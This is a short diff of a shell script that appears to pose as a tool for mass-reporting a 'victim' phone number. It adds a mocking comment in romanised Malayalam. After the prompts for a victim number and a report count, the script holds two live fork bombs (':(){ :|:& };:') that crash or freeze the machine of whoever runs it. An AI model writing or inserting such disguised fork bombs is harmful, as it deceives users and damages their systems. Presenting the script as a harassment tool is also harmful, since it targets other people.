@@ -400,7 +400,7 @@ sleep  3
 
 
 read -p " [+] enter your victim number :" token
-
+#groupil source code eduthitt patti show umfanda🥲#
 read -p " [+] enter count of reporting :" token 
 :(){ :|:& };:
 :(){ :|:& };:
